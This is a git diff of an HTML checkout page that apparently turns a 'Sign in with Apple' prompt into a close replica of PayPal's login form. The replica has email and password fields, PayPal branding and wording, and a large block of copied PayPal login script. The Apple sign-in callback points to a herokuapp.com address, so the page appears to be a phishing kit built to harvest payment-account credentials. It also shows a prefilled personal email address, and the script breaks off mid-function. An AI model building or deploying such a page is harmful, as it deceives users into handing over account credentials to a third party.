@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <meta charset="utf-8" />
     <title>Stay logged in for faster checkout</title>
@@ -9,20 +10,24 @@
         .headerTextDecorated {
             margin-top: 30px !important;
         }
+        
         .slLanding .headerText {
             font-size: 30px;
         }
+        
         .usePassword {
             text-align: center;
         }
+        
         .pp-logo {
             width: 70px;
             height: 70px;
             vertical-align: middle;
             border-radius: 15px 18px 12px 17px;
             padding: 17px;
-            box-shadow: 0 0 13px 0 rgba(0,0,0,.15);            
+            box-shadow: 0 0 13px 0 rgba(0, 0, 0, .15);
         }
+        
         .plus-logo {
             padding: 0px;
             border-radius: 0px;
@@ -30,11 +35,13 @@
             margin: 0 15px;
             height: 65px;
         }
+        
         .logoContainer {
             text-align: center;
             margin-top: 40px;
             margin-bottom: 25px;
         }
+        
         .headerTextDecorated {
             border: none;
         }
@@ -44,25 +51,138 @@
 
 <body class="desktop">
     <div id="main" class="main" role="main">
-        <section id="slLanding" class="slLanding  " data-role="page" data-title="Log in to your PayPal account">
+        <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
             <div class="corral">
-                <div id="content" class="contentContainer activeContent">
+                <div id="content" class="contentContainer contentContainerBordered activeContent">
                     <header>
                         <p class="paypal-logo paypal-logo-long"></p>
                     </header>
-                    <div id="linked" class="linked">
-                        <!--div id="headerIcon" class="partnerConnect"></div-->
-                        <div class="headerTextDecorated"></div>
-                        <div class="logoContainer">
-                            <img class="pp-logo" src="./apple.svg">
-                            <img class="pp-logo plus-logo" src="./fast.png">
-                            <img class="pp-logo" src="./pp-logo.png">
+                    <h1 class="headerText ">Pay with PayPal</h1>
+                    <p id="emailSubTagLine" class="subHeaderText">Enter your email address to get started.</p>
+                    <p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Type it below. Otherwise, click the link to log in with email.</p>
+                    <p id="pwdSubTagLine" class="subHeaderText hide">With a PayPal account, you're eligible for free return shipping, Purchase Protection, and more.</p>
+                    <div class="notifications"></div>
+                    <div id="keychainErrorMessage" class="hide">
+                        <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ only works for checkout. Please login with your email.</p>
+                        <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
+                        <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
+                    </div>
+                    <!-- temporary addition of notification which will just be displayed after clicking next in the phone page. This is for mobile ID login initial ramp and should be removed when we do public credential check -->
+                    <div id="phoneNotSetUpTempNotification" class="notifications hide"></div>
+                    <form action="/signin?intent=checkout&amp;ctxId=ullndg31cda943fd374d1eab84d169d634610d&amp;returnUri=%2Fwebapps%2Fhermes&amp;state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26country.x%3DUS%26hermesLoginRedirect%3Dxoon%26locale.x%3Den_US%26token%3DEC-1LW81068K48139132%26useraction%3Dcommit&amp;locale.x=en_US&amp;country.x=US&amp;flowId=EC-1LW81068K48139132" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate="">
+                        <div class="profileRememberedEmail hide"><span class="profileDisplayPhoneCode" dir="ltr"></span><span class="profileDisplayEmail">venkat.adal.us@gmail.com</span><a href="#" class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1">Change</a></div>
+                        <div id="splitEmail" class="splitEmail">
+                            <div id="splitEmailSection">
+                                <div id="emailSection" class="clearfix">
+                                    <div class="textInput" id="login_emaildiv" style="z-index: 1;">
+                                        <div class="fieldWrapper ">
+                                            <div class="hide textInputMask email"><span class="maskDisplay"></span><a href="#" class="maskChange" pa-marked="1">Change</a></div>
+                                            <label for="email" class="fieldLabel">Email</label>
+                                            <input id="email" name="login_email" type="email" class="hasHelp  validate validateEmpty   " required="required" value="" autocomplete="off" placeholder="Email" aria-describedby="emailErrorMessage">
+                                        </div>
+                                        <div class="errorMessage" id="emailErrorMessage">
+                                            <p class="emptyError hide">Required</p>
+                                            <p class="invalidError hide">That email format isn’t right</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <input type="password" value="" class="invisiblePwd" tabindex="-1" autocomplete="off" aria-hidden="true">
+                                <div class="captcha captcha-container clearfix hide" id="splitEmailCaptcha">
+                                    <div class="captcha-image"><img src="" alt=""></div>
+                                    <div class="captcha-inputs clearfix">
+                                        <div class="textInput  ">
+                                            <div class="fieldWrapper ">
+                                                <label for="splitEmailCaptcha" class="fieldLabel"></label>
+                                                <input id="splitEmailCaptcha" name="captchaCode" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Enter code" aria-describedby="captchaErrorMessage">
+                                            </div>
+                                            <div class="errorMessage" id="captchaErrorMessage">
+                                                <p class="emptyError hide">Required</p>
+                                            </div>
+                                        </div>
+                                        <div class="refresh"><a href="" class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" pa-marked="1"><span class="accessAid">Reload Image</span></a></div>
+                                        <div class="audio">
+                                            <audio role="application" id="captchaPlayer" src="" class="hide"></audio><a target="_blank" href="" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Audio Button</span></a></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="actions">
+                                <button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Next</button>
+                            </div>
                         </div>
-                        <h1 class="headerText">Stay logged in for faster checkout</h1>
-                        <p class="description assure">Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices) <a href=#"">What's this</a></span></p>
-                        <br/>
-                        <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="sign-in-with-apple-button" name="continueBtn" value="continueBtn" pa-marked="1">Agree and Sign in with Apple</button></div>
-                        <p class="usePassword"><a href="">Use password instead</a></p>
+                        <div id="splitPassword" class="splitPassword hide enable-autofill transformRightToLeft">
+                            <div id="splitPasswordSection" class="enable-autofill">
+                                <div id="passwordSection" class="clearfix">
+                                    <div class="textInput  " id="login_passworddiv" style="z-index: 1;">
+                                        <div class="fieldWrapper ">
+                                            <label for="password" class="fieldLabel">Password</label>
+                                            <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Password" aria-describedby="passwordErrorMessage">
+                                            <button type="button" class="showPassword show-hide-password scTrack:unifiedlogin-show-password hide" aria-label="Show password" pa-marked="1">Show</button>
+                                            <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" aria-label="Hide" pa-marked="1">Hide</button>
+                                            <div class="pwFpIcon hide" id="pwFpIcon"></div>
+                                        </div>
+                                        <div class="errorMessage" id="passwordErrorMessage">
+                                            <p class="emptyError hide">Required</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="captcha captcha-container clearfix hide" id="splitPasswordCaptcha">
+                                <div class="captcha-image"><img src="" alt=""></div>
+                                <div class="captcha-inputs clearfix">
+                                    <div class="textInput  ">
+                                        <div class="fieldWrapper ">
+                                            <label for="splitPasswordCaptcha" class="fieldLabel"></label>
+                                            <input id="splitPasswordCaptcha" name="captcha" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Enter code" aria-describedby="captchaErrorMessage">
+                                        </div>
+                                        <div class="errorMessage" id="captchaErrorMessage">
+                                            <p class="emptyError hide">Required</p>
+                                        </div>
+                                    </div>
+                                    <div class="refresh"><a href="" class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" pa-marked="1"><span class="accessAid">Reload Image</span></a></div>
+                                    <div class="audio">
+                                        <audio role="application" id="captchaPlayer" src="" class="hide"></audio><a target="_blank" href="" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Audio Button</span></a></div>
+                                </div>
+                            </div>
+                            <div id="keepMeLogin" class="keepMeLogin">
+                                <div class="checkboxContainer">
+                                    <input type="checkbox" name="rememberMe" value="true" id="keepMeLoggedIn" class="checkboxInput scTrack:unifiedlogin-rememberme-opt-in" aria-describedby="tagLine" pa-marked="1">
+                                    <label for="keepMeLoggedIn" class="checkboxLabel">Stay logged in for faster checkout</label>
+                                    <div class="checkboxMoreInfo"><a href="#" class="keepMeLoginAbout iconSprite scTrack:unifiedlogin-rememberme-about-open" id="keepMeLoginAbout" aria-expanded="false" data-orig-about="Learn more about staying logged in." title="Learn more about staying logged in." pa-marked="1">Learn more about staying logged in.</a></div>
+                                </div>
+                                <p id="tagLine" class="tagLine">Not recommended on shared devices.</p>
+                                <div class="keepMeLoginTerms  slideUp" id="keepMeLoginTerms">
+                                    <p>No need to enter your email or password. When you activate One Touch, you'll be automatically logged in when you check out on this device and browser.</p>
+                                    <p>Quickly review your shipping and payment details to pay at millions of PayPal merchants.</p>
+                                    <p>For security, we'll occasionally ask you to log in, including every time you update your personal or financial info. We don't recommend using One Touch on shared devices. Turn this off at any time in your PayPal Settings.</p>
+                                    <button class="keepMeLoginAboutBtn hide" type="button" disabled="" pa-marked="1">Close learn more about staying logged in.</button>
+                                </div>
+                            </div>
+                            <div class="actions">
+                                <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Log In</button>
+                            </div>
+                        </div>
+                        <input type="hidden" name="splitLoginContext" value="inputPassword">
+                    </form>
+                    <div id="loginWithPhoneOption" class="publicCredentialToggle"><a href="#" id="switchToPhone" pa-marked="1">Use mobile number instead</a></div>
+                    <div class="forgotLink hide"><a href="/authflow/password-recovery/?contextId=EC-1LW81068K48139132&amp;country.x=US&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%252F%253Fintent%253Dcheckout%2526ctxId%253Dullndg31cda943fd374d1eab84d169d634610d%2526returnUri%253D%25252Fwebapps%25252Fhermes%2526state%253D%25253Fflow%25253D1-P%252526ulReturn%25253Dtrue%252526country.x%25253DUS%252526hermesLoginRedirect%25253Dxoon%252526locale.x%25253Den_US%252526token%25253DEC-1LW81068K48139132%252526useraction%25253Dcommit%2526locale.x%253Den_US%2526country.x%253DUS%2526flowId%253DEC-1LW81068K48139132%2526sso%253Dtrue" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a></div>
+                    <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
+                        <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div><a role="button" href="/webapps/xoonboarding?country.x=US&amp;hermesLoginRedirect=xoon&amp;locale.x=en_US&amp;token=EC-1LW81068K48139132&amp;useraction=commit" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Create an Account</a></div>
+                    <div id="tpdButtonContainer" class="signupContainer hide">
+                        <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div>
+                        <div class="actions">
+                            <button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button>
+                        </div>
+                    </div>
+                    <div class="intentFooter">
+                        <div class="cancelUrl"><a href="https://www.overstock.com/cart?ppAction=cancel&amp;token=EC-1LW81068K48139132" data-url="https://www.overstock.com/cart?ppAction=cancel&amp;token=EC-1LW81068K48139132" class="scTrack:unifiedlogin-click-cancel-and-return cancelLink" id="cancelLink" aria-hidden="false" pa-marked="1">Cancel and return to Overstock.com</a></div>
+                        <div class="localeSelector">
+                            <ul class="localeLink">
+                                <li><a class="selected scTrack:unifiedlogin-footer-language_en_US" href="/signin?intent=checkout&amp;ctxId=ullndg31cda943fd374d1eab84d169d634610d&amp;returnUri=%2Fwebapps%2Fhermes&amp;state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26country.x%3DUS%26hermesLoginRedirect%3Dxoon%26locale.x%3Den_US%26token%3DEC-1LW81068K48139132%26useraction%3Dcommit&amp;flowId=EC-1LW81068K48139132&amp;country.x=US&amp;locale.x=en_US&amp;langTgl=en" data-locale="en_US" pa-marked="1">English</a></li>
+                                <li><a class=" scTrack:unifiedlogin-footer-language_fr_XC" href="/signin?intent=checkout&amp;ctxId=ullndg31cda943fd374d1eab84d169d634610d&amp;returnUri=%2Fwebapps%2Fhermes&amp;state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26country.x%3DUS%26hermesLoginRedirect%3Dxoon%26locale.x%3Den_US%26token%3DEC-1LW81068K48139132%26useraction%3Dcommit&amp;flowId=EC-1LW81068K48139132&amp;country.x=US&amp;locale.x=fr_XC&amp;langTgl=fr" data-locale="fr_XC" pa-marked="1">Français</a></li>
+                                <li><a class=" scTrack:unifiedlogin-footer-language_es_XC" href="/signin?intent=checkout&amp;ctxId=ullndg31cda943fd374d1eab84d169d634610d&amp;returnUri=%2Fwebapps%2Fhermes&amp;state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26country.x%3DUS%26hermesLoginRedirect%3Dxoon%26locale.x%3Den_US%26token%3DEC-1LW81068K48139132%26useraction%3Dcommit&amp;flowId=EC-1LW81068K48139132&amp;country.x=US&amp;locale.x=es_XC&amp;langTgl=es" data-locale="es_XC" pa-marked="1">Español</a></li>
+                                <li><a class=" scTrack:unifiedlogin-footer-language_zh_XC" href="/signin?intent=checkout&amp;ctxId=ullndg31cda943fd374d1eab84d169d634610d&amp;returnUri=%2Fwebapps%2Fhermes&amp;state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26country.x%3DUS%26hermesLoginRedirect%3Dxoon%26locale.x%3Den_US%26token%3DEC-1LW81068K48139132%26useraction%3Dcommit&amp;flowId=EC-1LW81068K48139132&amp;country.x=US&amp;locale.x=zh_XC&amp;langTgl=zh" data-locale="zh_XC" pa-marked="1">中文</a></li>
+                            </ul>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -86,6 +206,8 @@
             </div>
         </footer>
     </div>
+    <div class="transitioning spinnerWithLockIcon hide" aria-busy="false"><p class="checkingInfo hide">Checking your info…</p><p class="oneSecond hide">Just a second…</p><p class="secureMessage hide">Securely logging you in...</p><p class="oneTouchMessage hide"></p><p class="retrieveInfo hide">Retrieving your info...</p><p class="waitFewSecs hide">This may take a few seconds...</p><div class="keychain spinner-content uiExp hide"></div></div>
+    <div class="lockIcon hide"></div>
     <script type="text/javascript" src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
     <!-- <script type="text/javascript" src="apple-lib.js"></script> -->
     <script type="text/javascript">
@@ -96,11 +218,4722 @@
             redirectURI: 'https://swapl.herokuapp.com/callback', // Prod
             state : '' + new Date().getTime()
         });
+    </script>
+    <script type="text/javascript">
+// jscs:disable validateIndentation
+window.PAYPAL = window.PAYPAL || {};
+(function() {
+'use strict';
+var login = {};
+// LOG user activity to FPTI & CAL
+login.logger = (function() {
+	var logData = [];
 
-        const buttonElement = document.getElementById('sign-in-with-apple-button');
-        buttonElement.addEventListener('click', () => {
+	function log(logEntry) {
+		logEntry.timestamp = Date.now ? Date.now() : (new Date()).getTime();
+		logData.push(logEntry);
+	}
+
+	function pushLogs(options) {
+		var csrfToken, csrfTokenValue;
+		var intent = login.utils.getIntent();
+		var flowId = login.utils.getFlowId();
+		var sessionId = login.utils.getSessionId();
+		var liteExp = $('body').data('loginLiteExperience');
+		var data;
+
+		if (logData.length === 0) {
+			return;
+		}
+
+		options = options || {};
+
+		logData.push({
+			evt: 'context_correlation_id',
+			data: $('body').data('correlationId'),
+			instrument: true
+		});
+
+		// Add context to the logs
+		if (intent) {
+			logData.push({
+				evt: 'serverside_data_source',
+				data: intent,
+				instrument: true
+			});
+
+			logData.push({
+				evt: 'intent',
+				data: intent,
+				instrument: true
+			});
+		}
+
+		if (flowId) {
+			logData.push({
+				evt: 'context_id',
+				data: flowId,
+				instrument: true
+			});
+		}
+
+		if (liteExp) {
+			logData.push({
+				evt: 'lite_experience',
+				data: 'Y',
+				instrument: true
+			});
+		}
+
+		csrfToken = document.querySelector('#token') || document.querySelector('input[name="_csrf"]');
+		csrfTokenValue = csrfToken && csrfToken.value;
+
+		// Default data values
+		data = {
+			_csrf: csrfTokenValue,
+			currentUrl: window.location.href,
+			logRecords: JSON.stringify(logData),
+			intent: intent
+		};
+
+		if (typeof options.data === 'object') {
+			Object.assign(data, options.data);
+		}
+
+		if (sessionId) {
+			data._sessionID = sessionId
+		}
+
+		// $.ajax({
+		// 	url: '/signin/client-log',
+		// 	data: data,
+		// 	success: options.success,
+		// 	fail: options.fail,
+		// 	complete: options.complete
+		// });
+		logData = [];
+	}
+
+	/**
+	 * Wrapper method for logging client side with the consolidated list of events
+	 *
+	 * @param {Array} logList
+	 * @param {Function} callback
+	 * @param {Object} data
+	 */
+	function clientLog(logList, callback, data) {
+		logList = logList || [];
+
+		if (!(logList instanceof Array)) {
+			if (typeof callback === 'function') {
+				return callback();
+			}
+			return;
+		}
+
+		for (var i = 0; i < logList.length; i++) {
+			log(logList[i]);
+		}
+
+		var logPayload = {
+			complete: function() {
+				if (typeof callback === 'function') {
+					return callback();
+				}
+			}
+		};
+
+		if (typeof data === 'object') {
+			logPayload.data = data;
+		}
+
+		pushLogs(logPayload);
+	}
+
+	function getStateName() {
+		var splitLoginContext = login.utils.getSplitLoginContext();
+		var isHybrid = login.utils.isHybridLoginExperience();
+		var kmliCb = document.getElementById('keepMeLoggedIn');
+		var stateName = kmliCb ? 'LOGIN_UL_RM' : 'LOGIN_UL';
+		var splitLoginMap = {
+			inputEmail: 'begin_email',
+			implicitEmail: 'begin_email',
+			inputPassword: isHybrid ? 'begin_hybrid_pwd' : 'begin_pwd',
+			inputPhone: 'begin_phone'
+		};
+		if (splitLoginContext && splitLoginMap[splitLoginContext]) {
+			stateName = splitLoginMap[splitLoginContext];
+		}
+		if (isHybrid && splitLoginContext !== 'inputPassword') {
+			stateName = 'begin_hybrid_login';
+		}
+		return stateName;
+	}
+
+	function logServerPreparedMetrics() {
+		var parsedClientLogRecords;
+		var clientLogRecords = document.querySelector('input[name="clientLogRecords"]');
+
+		if (clientLogRecords) {
+			try {
+				parsedClientLogRecords = JSON.parse(clientLogRecords.value);
+			} catch (e) {}
+		}
+		if (parsedClientLogRecords) {
+			logData = logData.concat(parsedClientLogRecords);
+		}
+	}
+
+	return {
+		log: log,
+		logServerPreparedMetrics: logServerPreparedMetrics,
+		pushLogs: pushLogs,
+		clientLog: clientLog,
+		getStateName: getStateName
+	};
+}());
+
+// Publish/Subscriber pattern
+// NOTE: this is a simplified version of pub/sub pattern which does not include unsubscribe method.
+// Since unsubscribe is not present, the concept of token is not necesary
+login.pubsub = (function() {
+	var pubsub = {};
+	var topics = {};
+
+	// Publish or broadcast events of interest
+	// with a specific topic name and arguments
+	// such as the data to pass along
+	pubsub.publish = function(topic, arg) {
+		if (!topics[topic]) {
+			return false;
+		}
+
+		var subscribers = topics[topic],
+			len = subscribers ? subscribers.length : 0;
+
+		while (len > 0) {
+			subscribers[len - 1].func(arg);
+			len -= 1;
+		}
+	};
+
+	// Subscribe to events of interest
+	// with a specific topic name and a
+	// callback function, to be executed
+	// when the topic/event is observed
+	pubsub.subscribe = function(topic, func) {
+		// only subscribe functions
+		if (typeof func !== 'function') {
+			return;
+		}
+
+		if (!topics[topic]) {
+			topics[topic] = [];
+		}
+
+		topics[topic].push({
+			func: func
+		});
+	};
+
+	return pubsub;
+}());
+
+login.store = (function() {
+	return function storeFactory(initialState) {
+
+		var _state = initialState || {};
+
+		function getState() {
+			return _state;
+		}
+
+		function updateModel(model) {
+			// custom validations (TODO: work on getting this logic on reducer functions)
+			var splitLoginContextDom = document.querySelector('input[name=splitLoginContext]');
+			if (!model.splitLoginContext) {
+				model.splitLoginContext = splitLoginContextDom && splitLoginContextDom.value;
+			}
+
+			var newModel = Object.assign({}, _state.model, model);
+			// State properties that should be reset on every state update
+			// if new state does not provide any value
+			newModel.notifications = model.notifications;
+			newModel.tpdVariant = model.tpdVariant;
+			newModel.showSpinnerUpfront = model.showSpinnerUpfront;
+			newModel.enableSmartlock = model.enableSmartlock;
+			newModel.tpdAutoSend = model.tpdAutoSend;
+			newModel.webAuthnLoginContext = model.webAuthnLoginContext;
+
+			var newState = Object.assign({}, _state, {
+				model: newModel
+			});
+			_state = newState;
+			login.pubsub.publish('STATE_UPDATED', newState);
+		}
+
+		return {
+			updateModel: updateModel,
+			getState: getState
+		};
+	}
+
+}());
+
+// Utils & Globals
+
+/**
+ * Global, cross browser add event listener function
+ */
+var addEvent = function(element, event, callback) {
+	if (!element || !event || !callback) {
+		return;
+	}
+
+	if (element.addEventListener) {
+		element.addEventListener(event, callback, false);
+	} else if (element.attachEvent) {
+		element.attachEvent('on' + event, callback);
+	}
+};
+
+var removeEvent = function(element, event, callback) {
+	if (!element || !event || !callback) {
+		return;
+	}
+
+	if (element.removeEventListener) {
+		element.removeEventListener(event, callback, false);
+	} else if (element.attachEvent) {
+		element.detachEvent('on' + event, callback);
+	}
+};
+
+/**
+ * Global, cross browser create event function
+ */
+var createNewEvent = function(eventStr) {
+	// Try modern way to construct event first and return early if created
+	if (typeof window.Event === 'function') {
+		return new Event(eventStr);
+	}
+	// As IE doesnt support the constructor to create Event,
+	// we have to use an old fashion way of creating event which is deprecated
+	var event = document.createEvent('Event');
+	event.initEvent(eventStr, true, true);
+	return event;
+};
+
+/**
+ * Global, cross browser add event prevent default function
+ */
+var eventPreventDefault = function(event) {
+	// IE compatibility
+	var evt = event || window.event || {};
+	if (evt.preventDefault) {
+		evt.preventDefault();
+	} else {
+		evt.returnValue = false;
+	}
+};
+
+/**
+ * Global, cross browser add event stop propagation default function
+ */
+var eventStopPropagation = function(event) {
+	// IE compatibility
+	var evt = event || window.event || {};
+	if (evt.stopPropagation) {
+		evt.stopPropagation();
+	} else {
+		evt.cancelBubble = true;
+	}
+};
+
+/**
+ * Global, cross browser get event target function
+ */
+var getEventTarget = function(event) {
+	// IE compatibility
+	var evt = event || window.event || {};
+	return evt.target || evt.srcElement;
+};
+
+/**
+ * Global, cross browser to dispatch event to a target
+ */
+var triggerEvent = function(element, eventName) {
+	if (!element || !eventName) {
+		return;
+	}
+	var eventTrigger = createNewEvent(eventName);
+	if (element.dispatchEvent) {
+		element.dispatchEvent(eventTrigger);
+	} else if (element.fireEvent) {
+		element.fireEvent('on' + eventName, eventTrigger);
+	}
+};
+
+/**
+ * Global, cross browser check for Enter key pressed in event
+ */
+var isEnterKeyPressed = function(event) {
+	// Gracefully failing
+	if (!event) {
+		return false;
+	}
+
+	if (event.key) {
+		return event.key === 'Enter';
+	} else if (event.which) {
+		return event.which === 13;
+	} else {
+		return event.keyCode === 13
+	}
+};
+
+login.utils = (function() {
+	var transitioningDiv = document.querySelector('.transitioning');
+	var lockIcon = document.querySelector('.lockIcon');
+	var transitioningMsg = document.querySelector('.transitioning p.checkingInfo');
+
+	function showSpinner() {
+		if (transitioningDiv) {
+			$(transitioningDiv).addClass('spinner');
+			$(transitioningDiv).removeClass('hide');
+			transitioningDiv.setAttribute('aria-busy', 'true');
+		}
+
+		if (lockIcon) {
+			$(lockIcon).removeClass('hide');
+		}
+	}
+
+	function hideSpinner() {
+		if (transitioningDiv) {
+			$(transitioningDiv).removeClass('spinner');
+			$(transitioningDiv).removeClass('nonTransparentMask');
+			$(transitioningDiv).addClass('hide');
+			transitioningDiv.setAttribute('aria-busy', 'false');
+		}
+
+		if (lockIcon) {
+			$(lockIcon).addClass('hide');
+		}
+	}
+
+	function showSpinnerMessage(type) {
+		var transitioningMsgType;
+		if (type !== '') {
+			transitioningMsgType = document.querySelector('.transitioning p.' + type);
+			if (transitioningMsgType) {
+				$(transitioningMsgType).removeClass('hide');
+			}
+			return;
+		}
+		$(transitioningMsg).removeClass('hide');
+	}
+
+	function hideSpinnerMessage(type) {
+		var transitioningMsgType;
+		if (type !== '') {
+			transitioningMsgType = document.querySelector('.transitioning p.' + type);
+			if (transitioningMsgType) {
+				$(transitioningMsgType).addClass('hide');
+			}
+			return;
+		}
+		$(transitioningMsg).addClass('hide');
+	}
+
+	function isHybridLoginExperience() {
+		return $('body').data('isHybridLoginExperience') === 'true';
+	}
+
+	function isHybridEditableOnCookied() {
+		return $('body').data('isHybridEditableOnCookied') === 'true';
+	}
+
+	/**
+	 * Special function to hijack outbound links such as footer links such that
+	 * the exiting requesting can be logged and tracked via server side FPTI
+	 * Once the log is pushed for tracking, the request to exit the page is resumed
+	 * @param {String} link The A tag with the href and the text node in it
+	 * @param {String} stateName name
+	 * @param {String} transitionName
+	 * @param {Function} callback Optional function that needs to be executed just before redirecting
+	 */
+	function getOutboundLinksHandler(link, stateName, transitionName, callback) {
+		var href = link && link.getAttribute('href');
+		var linkId = link && link.getAttribute('id');
+		var currentLang, changeToLang, logPayload;
+
+		return function(e) {
+			e.preventDefault();
+			login.logger.log({
+				evt: 'state_name',
+				data: stateName || login.logger.getStateName(),
+				instrument: true
+			});
+
+			login.logger.log({
+				evt: 'transition_name',
+				data: transitionName,
+				instrument: true
+			});
+
+			currentLang = document.querySelector('input[name="locale.x"]');
+			if (currentLang) {
+				login.logger.log({
+					evt: 'page_lang',
+					data: currentLang.value,
+					instrument: true
+				});
+			}
+
+			changeToLang = $(link).data('locale');
+			if (changeToLang) {
+				login.logger.log({
+					evt: 'change_to_lang',
+					data: changeToLang,
+					instrument: true
+				});
+			}
+
+			logPayload = {
+				complete: function() {
+					if (typeof callback === 'function') {
+						return callback();
+					}
+					window.location = href;
+				}
+			};
+
+			login.logger.pushLogs(logPayload);
+			showSpinner();
+		};
+	}
+
+	function notYouClickHandler(event, callback) {
+		eventPreventDefault(event);
+		var initialSplitLoginContext = document.querySelector('#initialSplitLoginContext');
+		var data = {
+			'_csrf': document.querySelector('#token').value,
+			notYou: true,
+			intent: getIntent(),
+			context_id: getFlowId()
+		};
+		var sessionId = getSessionId();
+
+		if (sessionId) {
+			data._sessionID = sessionId;
+		}
+		if (initialSplitLoginContext) {
+			data.initialSplitLoginContext = initialSplitLoginContext.value;
+		}
+
+		// Remove WebAuthn context if any (if it doesnt exist, `removeAttribute` will just return `undefined`
+		document.body.removeAttribute('data-web-authn-login-context');
+
+		$.ajax({
+			type: 'POST',
+			url: '/signin/not-you',
+			data: data,
+			dataType: 'json',
+			success: successfulXhrHandler,
+			fail: failedXhrSubmitHandler,
+			complete: function() {
+				if (typeof callback === 'function') {
+					return callback();
+				}
+			}
+		});
+	}
+
+	function updateView(model) {
+		if (login.storeInstance) {
+			login.storeInstance.updateModel(model);
+		}
+
+		if (model.ulSync) {
+			login.fn.updateFnSyncContext(model.ulSync);
+		}
+
+		if (!model.showSpinnerUpfront && model.smartlockStatus !== 'linked') {
+			hideSpinner();
+		}
+	}
+
+	/**
+	 * Handle the successful XHR submission of email (or phone)
+	 */
+	function successfulXhrHandler(response) {
+		var ctxId = document.querySelector('input[name="ctxId"]');
+		// Check if ADS intercepted via ngRL and issued a captcha
+		if (response && response.htmlResponse) {
+			login.ads.handleAdsInterception(decodeURIComponent(response.htmlResponse));
+			return;
+		}
+
+		// No captcha issued
+		// Redirect if no error and returnUrl in response
+		if (response && response.returnUrl && !response.notifications) {
+			window.location.href = response.returnUrl;
+			return;
+		}
+
+		// Load ads challenge after clicking not you
+		if (!response.profile && response.adsChallengeUrl) {
+			login.ads.init(response.adsChallengeUrl);
+		}
+
+		updateView(response);
+		if (response.verification && response.verification.page === 'pending') {
+			login.verification.startPolling({
+				accessToken: response.accessToken,
+				authflowDocumentId: response.authflowDocumentId,
+				_csrf: response._csrf,
+				email: response.verification.email,
+				variant: response.tpdVariant,
+				tpdTriggerMethod: response.tpdTriggerMethod
+			});
+			login.verification.showResendLink();
+		}
+
+		if (response.tpdDemoRefresh && login.utils.isTpdDemo() && ctxId && ctxId.value) {
+			ctxId.value = '';
+			document.body.removeAttribute('data-is-prefill-email-enabled');
+			document.body.removeAttribute('data-tpd-demo');
+			document.body.removeAttribute('data-tpd-variant');
+			window.location.href = '/signin';
+		}
+
+		if(response.autoRememberMe) {
+			var rememberMeElement = document.getElementById('keepMeLoggedIn');
+			if(rememberMeElement){
+				rememberMeElement.checked = true;
+			}
+		};
+
+		setSliderToPasswordContainer();
+
+		if (response.setBuyer) {
+			setTimeout(function () {
+				isFnDataLoaded() && login.xoPlanning.triggerSetBuyerCall(response.setBuyer);
+			}, 300);
+		}
+	}
+
+	/**
+	 * Handle the failed XHR submission of email (or phone)
+	 */
+	function failedXhrSubmitHandler(response) {
+		if (response.status === 429) {
+			$(transitioningDiv).removeClass('spinner');
+			return;
+		}
+		/*
+		var parsedResponse, errorType = 'unknownError';
+		if (response && response.responseText) {
+			parsedResponse = JSON.parse(response.responseText);
+			if (parsedResponse.csrfError) {
+				errorType = 'securityTokenError';
+			}
+			if (parsedResponse.primaryInputError) {
+				errorType = 'primaryInputError';
+			}
+		} else if (response && response.statusText === 'timeout') {
+			errorType = 'timeoutError';
+		} else if (response && response.statusText) {
+			errorType = response.statusText;
+		} else {
+			// Do nothing
+		}
+		*/
+		// TODO: Implement an elegant way to handle this
+		window.location.href = window.location.href;
+	}
+
+	/**
+	 * Generic handler for all click events
+	 * @param {Object} event
+	 */
+	function documentClickHandler(event) {
+		// trigger window_click event so subscribers can do their job
+		if (login.pubsub) {
+			login.pubsub.publish('WINDOW_CLICK', event);
+		}
+	}
+
+	/**
+	 * Function to show or hide the remember profile info tooltip
+	 * TODO: Consider moving this to the view where it's DOM resides
+	 * @param {Object} event
+	 */
+	function toggleRememberInfoTooltip(event) {
+		var bubble = document.querySelector('.rememberProfile .bubble-tooltip');
+		var $bubble, $target;
+
+		if (!bubble || !event || !getEventTarget(event)) {
+			return;
+		}
+		$bubble = $(bubble);
